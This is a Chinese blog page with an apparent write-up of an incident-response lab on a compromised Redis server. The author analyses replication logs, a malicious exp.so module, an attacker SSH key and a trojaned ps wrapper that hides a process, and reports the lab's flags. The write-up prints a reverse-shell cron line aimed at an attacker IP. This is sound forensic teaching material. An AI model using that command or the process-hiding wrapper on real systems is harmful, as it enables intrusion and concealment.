<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/b02d931ae848b785.css" as="style"/><link rel="stylesheet" href="/_next/static/css/b02d931ae848b785.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-81a2b7b9623e52f7.js" defer=""></script><script src="/_next/static/oMFqh6VxQZoYSF5uQbT2C/_buildManifest.js" defer=""></script><script src="/_next/static/oMFqh6VxQZoYSF5uQbT2C/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"玄机第二章 日志分析-redis应急响应","contentHtml":"\u003ch1\u003e第二章 日志分析-redis应急响应\u003c/h1\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少，将黑客 IP 作为 FLAG 提交\u003c/p\u003e\n\u003cp\u003e日志文件存在\u003ccode\u003e/var/log/redis.log\u003c/code\u003e ，其中\u003ccode\u003e192.168.100.13\u003c/code\u003e 出现了很多\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e419:S 31 Jul 2023 05:33:21.623 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:21.623 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e started\n419:S 31 Jul 2023 05:33:21.624 \u003cspan class=\"hljs-comment\"\u003e# Error condition on socket for SYNC: Connection refused\u003c/span\u003e\n419:S 31 Jul 2023 05:33:22.625 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:22.625 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e started\n419:S 31 Jul 2023 05:33:22.626 \u003cspan class=\"hljs-comment\"\u003e# Error condition on socket for SYNC: Connection refused\u003c/span\u003e\n419:S 31 Jul 2023 05:33:23.627 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:23.627 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e started\n419:S 31 Jul 2023 05:33:23.628 \u003cspan class=\"hljs-comment\"\u003e# Error condition on socket for SYNC: Connection refused\u003c/span\u003e\n419:S 31 Jul 2023 05:33:24.628 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:24.629 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e started\n419:S 31 Jul 2023 05:33:24.630 \u003cspan class=\"hljs-comment\"\u003e# Error condition on socket for SYNC: Connection refused\u003c/span\u003e\n419:S 31 Jul 2023 05:33:25.631 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:25.631 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e started\n419:S 31 Jul 2023 05:33:25.632 \u003cspan class=\"hljs-comment\"\u003e# Error condition on socket for SYNC: Connection refused\u003c/span\u003e\n419:S 31 Jul 2023 05:33:26.633 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:26.633 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e started\n419:S 31 Jul 2023 05:33:26.634 \u003cspan class=\"hljs-comment\"\u003e# Error condition on socket for SYNC: Connection refused\u003c/span\u003e\n419:S 31 Jul 2023 05:33:27.635 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:27.635 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e started\n419:S 31 Jul 2023 05:33:27.636 \u003cspan class=\"hljs-comment\"\u003e# Error condition on socket for SYNC: Connection refused\u003c/span\u003e\n419:S 31 Jul 2023 05:33:28.637 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:33:28.637 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e started\n419:S 31 Jul 2023 05:33:28.638 \u003cspan class=\"hljs-comment\"\u003e# Error condition on socket for SYNC: Connection refused\u003c/span\u003e\n419:S 31 Jul 2023 05:33:29.639 * Connecting to MASTER 192.168.100.13:8888\n419:S 31 Jul 2023 05:34:02.720 \u003cspan class=\"hljs-comment\"\u003e# Error condition on socket for SYNC: Connection refused\u003c/span\u003e\n419:S 31 Jul 2023 05:34:03.034 * REPLICAOF 192.168.31.55:8888 enabled (user request from \u003cspan class=\"hljs-string\"\u003e'id=5 addr=192.168.200.2:64319 fd=7 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=47 qbuf-free=32721 obl=0 oll=0 omem=0 events=r cmd=slaveof'\u003c/span\u003e)\n419:S 31 Jul 2023 05:34:03.722 * Connecting to MASTER 192.168.31.55:8888\n419:S 31 Jul 2023 05:34:03.722 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e started\n419:S 31 Jul 2023 05:34:33.173 * REPLICAOF 192.168.100.20:8888 enabled (user request from \u003cspan class=\"hljs-string\"\u003e'id=6 addr=192.168.200.2:64339 fd=7 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=48 qbuf-free=32720 obl=0 oll=0 omem=0 events=r cmd=slaveof'\u003c/span\u003e)\n419:S 31 Jul 2023 05:34:33.786 * Connecting to MASTER 192.168.100.20:8888\n419:S 31 Jul 2023 05:34:33.786 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e started\n419:S 31 Jul 2023 05:34:33.788 * Non blocking connect \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e SYNC fired the event.\n419:S 31 Jul 2023 05:34:35.192 * Master replied to PING, replication can \u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e...\n419:S 31 Jul 2023 05:34:35.194 * Trying a partial resynchronization (request 7a73a1a4297a16c50d8465b0cc432444f0e5df71:1).\n419:S 31 Jul 2023 05:34:35.195 * Full resync from master: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ:1\n419:S 31 Jul 2023 05:34:35.195 * Discarding previously cached master state.\n419:S 31 Jul 2023 05:34:35.195 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e: receiving 48040 bytes from master\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是看日志\u003ccode\u003e192.168.100.13\u003c/code\u003e没有登陆成功，\u003ccode\u003e192.168.100.20\u003c/code\u003e登陆成功了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eflag{192.168.100.20}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件，将黑客上传的恶意文件里面的 FLAG 提交\u003c/p\u003e\n\u003cp\u003e在日志中能看到尝试加载\u003ccode\u003eexp.so\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eS 31 Jul 2023 05:34:35.195 * Discarding previously cached master state.\n419:S 31 Jul 2023 05:34:35.195 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e: receiving 48040 bytes from master\n419:S 31 Jul 2023 05:34:35.197 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e: Flushing old data\n419:S 31 Jul 2023 05:34:35.197 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e: Loading DB \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e memory\n419:S 31 Jul 2023 05:34:35.197 \u003cspan class=\"hljs-comment\"\u003e# Wrong signature trying to load DB from file\u003c/span\u003e\n419:S 31 Jul 2023 05:34:35.197 \u003cspan class=\"hljs-comment\"\u003e# Failed trying to load the MASTER synchronization DB from disk\u003c/span\u003e\n419:S 31 Jul 2023 05:34:35.791 * Connecting to MASTER 192.168.100.20:8888\n419:S 31 Jul 2023 05:34:35.791 * MASTER \u0026#x3C;-\u003e REPLICA \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e started\n419:S 31 Jul 2023 05:34:35.792 * Non blocking connect \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e SYNC fired the event.\n419:S 31 Jul 2023 05:34:37.205 * Module \u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e loaded from ./exp.so\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@ip-10-0-10-1:/tmp# find / -name *exp.so*\n/exp.so\n/usr/lib/x86_64-linux-gnu/rsyslog/lmregexp.so\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e因为时二进制文件，通过\u003ccode\u003estrings\u003c/code\u003e命令来读取\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@ip-10-0-10-1:/tmp# strings /exp.so \n....\nflag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}\n....\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少，将反弹 shell 的IP 作为 FLAG 提交\u003c/p\u003e\n\u003cp\u003e通过日志，可以能看到两个IP，一般就是反弹shell\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e419:S 31 Jul 2023 05:33:15.065 * REPLICAOF 192.168.100.13:8888 enabled (user request from \u003cspan class=\"hljs-string\"\u003e'id=3 addr=192.168.200.2:64289 fd=7 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=48 qbuf-free=32720 obl=0 oll=0 omem=0 events=r cmd=slaveof'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这条日志表明副本（Replica）的 \u003ccode\u003eREPLICAOF\u003c/code\u003e 命令被更改，使其从 \u003ccode\u003e192.168.100.13:8888\u003c/code\u003e 这个新的主服务器同步。这种更改是由客户端 \u003ccode\u003eid=3\u003c/code\u003e 发送的，该客户端的 IP 地址是 \u003ccode\u003e192.168.200.2\u003c/code\u003e，使用端口 \u003ccode\u003e64289\u003c/code\u003e 进行连接。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\nflag{192.168.100.13}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e并且通过Redis未授权访问获得\u003ccode\u003eshell\u003c/code\u003e的方法其实也就几种，例如：定时任务，SSH公钥，写入\u003ccode\u003eWebShell\u003c/code\u003e等\u003c/p\u003e\n\u003cp\u003e查看计划任务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@ip-10-0-10-1:/tmp# crontab -l\n\u003cspan class=\"hljs-comment\"\u003e# Edit this file to introduce tasks to be run by cron.\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# Each task to run has to be defined through a single line\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# indicating with different fields when the task will be run\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# and what command to run for the task\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# To define the time you can provide concrete values for\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# minute (m), hour (h), day of month (dom), month (mon),\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# and day of week (dow) or use '*' in these fields (for 'any').\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# Notice that tasks will be started based on the cron's system\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# daemon's notion of time and timezones.\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# Output of the crontab jobs (including errors) is sent through\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# email to the user the crontab file belongs to (unless redirected).\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# For example, you can run a backup of all your user accounts\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# at 5 a.m every week with:\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# For more information see the manual pages of crontab(5) and cron(8)\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n*/1 * * * *  /bin/sh -i \u003e\u0026#x26; /dev/tcp/192.168.100.13/7777 0\u003e\u0026#x26;1\n\u003cspan class=\"hljs-comment\"\u003e# m h  dom mon dow   command\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中就有反弹\u003ccode\u003eshell\u003c/code\u003e的命令\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交\u003c/p\u003e\n\u003cp\u003e通过strings读取exp.so的字符串没有找到类似用户名的字符串\u003c/p\u003e\n\u003cp\u003e查看公钥文件能看到通过\u003ccode\u003eRedis\u003c/code\u003e写入的痕迹，后面跟着的标识\u003ccode\u003exj-test-user\u003c/code\u003e 可能就是用户名\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@ip-10-0-10-1:~/.ssh# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e authorized_keys \nREDIS0009�      redis-ver5.0.1�\n�edis-bits�@�ctime�tO�dused-mem�XU\n aof-preamble���xxsshB9\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDh4OEFvyb4ubM7YPvzG/FfO6jE4PjLdmuCUdGP+aeLeJB5SXYT6zHkU9wlfY/Fo4UuBlhTqBaS6Ih/Wf62KepzrMsTQQYcSG/Xp8lgFzVCCFAk7apzxfRCPNk1pxaGiEF6MPoCmUu1UhC3ta3xyh2c4KZls0hyFN9JZsuD+siT8KVqm856vQ+RaTrZi3ThMa5gbeH+v3ZUcO35ZfMKor/uWXffHT0Yi06dsgIMN3faIiBrd1Lg0B5kOTaDq3fHs8Qs7pvR9C4ZTm2AK/Oct8ULdsnfS2YWtrYyC8rzNip9Wf083ZY1B4bj1UoxD+QwgThh5VP3xgRd9KDSzEYIBabstGh8GU5zDxr0zIuhQM35I0aALvojXl4QaaEnZwpqU3ZkojPG2aNC0QdiBK7eKwA38Gk+V8DEWc/TTkO+wm3aXYdll5sPmoWTAonaln1nmCiTDn4jKb73DxYHfSgNIDpJ6fS5kbWL5UJnElWCrxzaXKHUlqXJj3x81Oz6baFNv8= xj-test-user\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过用户名到\u003ccode\u003eGithub\u003c/code\u003e去找工具，能找到：\u003ca href=\"https://github.com/xj-test-user/redis-rogue-getshell\"\u003ehttps://github.com/xj-test-user/redis-rogue-getshell\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e藏得挺深的（看了WP）\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那么Flag就是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eflag{xj-test-user-wow-you-find-flag}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过本地 PC SSH到服务器并且分析黑客篡改的命令，将黑客篡改的命令里面的关键字符串作为 FLAG 提交\u003c/p\u003e\n\u003cp\u003e如果出现篡改命令，那么篡改的应该是\u003ccode\u003e/usr/bin\u003c/code\u003e 里面的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@ip-10-0-10-1:/usr/bin# \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -lt | \u003cspan class=\"hljs-built_in\"\u003ehead\u003c/span\u003e -n 10\ntotal 197500\n-rwxrwxrwx 1 root root         178 Jul 31  2023 ps\n-rwxr-xr-x 1 root root      133432 Jul 31  2023 ps_\nlrwxrwxrwx 1 root root          25 Jul 31  2023 aclocal -\u003e /etc/alternatives/aclocal\nlrwxrwxrwx 1 root root          26 Jul 31  2023 automake -\u003e /etc/alternatives/automake\nlrwxrwxrwx 1 root root          21 Jul 31  2023 c99 -\u003e /etc/alternatives/c99\nlrwxrwxrwx 1 root root          21 Jul 31  2023 c89 -\u003e /etc/alternatives/c89\nlrwxrwxrwx 1 root root          20 Jul 31  2023 cc -\u003e /etc/alternatives/cc\n-rwxr-xr-x 1 root root    14663096 Jun 29  2023 amazon-ssm-agent\n-rwxr-xr-x 1 root root    24088632 Jun 29  2023 ssm-agent-worker\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e有两个\u003ccode\u003eps\u003c/code\u003e不对劲\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@ip-10-0-10-1:/usr/bin# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e ps\n\u003cspan class=\"hljs-comment\"\u003e#/bin/bash\u003c/span\u003e\noldifs=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$IFS\u003c/span\u003e\"\u003c/span\u003e\nIFS=\u003cspan class=\"hljs-string\"\u003e'\\$n'\u003c/span\u003e\nresult=$(ps_ \u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$2\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$3\u003c/span\u003e|grep -v \u003cspan class=\"hljs-string\"\u003e'threadd'\u003c/span\u003e )\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e v \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$result\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n        \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$v\u003c/span\u003e\\t\"\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\nIFS=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$oldifs\u003c/span\u003e\"\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#//c195i2923381905517d818e313792d196\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e黑客对\u003ccode\u003eps\u003c/code\u003e做了备份为\u003ccode\u003eps_\u003c/code\u003e ,并且把结果中带有\u003ccode\u003ethreadd\u003c/code\u003e 进程的结果排除掉了\u003c/p\u003e\n\u003cp\u003e那么\u003ccode\u003eFlag\u003c/code\u003e 应该就是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eflag{c195i2923381905517d818e313792d196}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"玄机 - 第二章 日志分析-redis应急响应","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["玄机","应急响应","日志分析"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"玄机第二章 日志分析-redis应急响应"},"buildId":"oMFqh6VxQZoYSF5uQbT2C","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>